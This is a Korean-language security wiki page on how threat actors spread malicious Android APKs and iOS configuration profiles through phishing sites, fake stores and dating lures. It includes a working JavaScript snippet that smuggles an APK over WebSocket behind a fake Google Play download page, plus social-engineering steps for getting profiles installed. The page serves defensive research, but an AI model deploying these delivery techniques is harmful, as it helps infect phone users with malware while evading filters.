# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> 이 페이지에서는 위협 행위자가 phishing(SEO, social engineering, fake stores, dating apps 등)을 통해 **malicious Android APKs** 및 **iOS mobile-configuration profiles**를 배포하는 데 사용하는 기법을 다룹니다.
> 이 자료는 Zimperium zLabs(2025)가 공개한 SarangTrap campaign 및 기타 공개 연구를 바탕으로 작성되었습니다.<sup>[[1]](#references)</sup>

## 공격 흐름

1. **SEO/Phishing 인프라**
* 수십 개의 유사 도메인(dating, cloud share, car service…)을 등록합니다.
– Google에서 순위를 높이기 위해 `<title>` element에 현지 언어 키워드와 이모지를 사용합니다.
– 동일한 landing page에서 Android(`.apk`) 및 iOS 설치 지침을 모두 호스팅합니다.
2. **1단계 다운로드**
* Android: *unsigned* 또는 “third-party store” APK로 연결되는 direct link.
* iOS: 악성 **mobileconfig** profile로 연결되는 `itms-services://` 또는 일반 HTTPS link(아래 참조).
3. **Android 설치 후 동작**
* C2-gated execution, permission abuse, dropper bypasses, background collection 및 기타 설치 후 malware 동작은 아래의 전용 Android Malware Post-Exploitation page에서 다룹니다.
4. **iOS 전달 기법**
* 하나의 **mobile-configuration profile**은 `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` 등을 요청하여 기기를 “MDM”과 유사한 supervision에 등록할 수 있습니다.
* Social engineering 지침:
1. Settings ➜ *Profile downloaded*를 엽니다.
2. *Install*을 세 번 탭합니다(phishing page에 screenshots 제공).
3. unsigned profile을 신뢰합니다 ➜ App Store review 없이 attacker가 *Contacts* 및 *Photo* entitlement를 획득합니다.
5. **iOS Web Clip Payload (phishing app icon)**
* `com.apple.webClip.managed` payload는 branding된 icon/label과 함께 **phishing URL을 Home Screen에 고정**할 수 있습니다.
* Web Clips는 **full-screen**으로 실행될 수 있어(browser UI 숨김), **non-removable**로 표시할 수도 있습니다. 이 경우 icon을 제거하려면 victim이 profile을 삭제해야 합니다.<sup>[[3]](#references)</sup>
6. **Network Layer**
* 일반 HTTP를 사용하며, 흔히 port 80에서 `api.<phishingdomain>.com`과 같은 HOST header를 사용합니다.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (TLS가 없어 쉽게 탐지 가능).

## Android Malware Post-Exploitation

C2, Accessibility abuse, overlays, ATS automation, staged DEX loading, premium SMS 및 persistence와 같은 설치 후 Android malware tradecraft는 다음 전용 page를 참조하십시오.

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

공격자는 점점 더 static APK links를 Google Play처럼 보이는 lures에 포함된 Socket.IO/WebSocket channel로 대체하고 있습니다. 이를 통해 payload URL을 숨기고, URL/extension filters를 우회하며, 현실적인 install UX를 유지할 수 있습니다.<sup>[[2]](#references)[[4]](#references)</sup>

실제 환경에서 관찰된 일반적인 client flow:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

간단한 제어를 우회하는 이유:
- 정적 APK URL이 노출되지 않으며, payload가 WebSocket 프레임에서 메모리상으로 재구성됩니다.
- 직접적인 .apk 응답을 차단하는 URL/MIME/extension 필터는 WebSockets/Socket.IO를 통해 터널링된 바이너리 데이터를 놓칠 수 있습니다.
- WebSockets를 실행하지 않는 crawler와 URL sandbox는 payload를 가져오지 못합니다.

WebSocket tradecraft 및 tooling도 참고하세요:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## 참고 자료

- [1] [Romance의 어두운 면: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Apple 디바이스용 Web Clips payload 설정](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [인도네시아 및 베트남 Android 사용자를 대상으로 한 Banker Trojan](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)

{{#include ../../banners/hacktricks-training.md}}
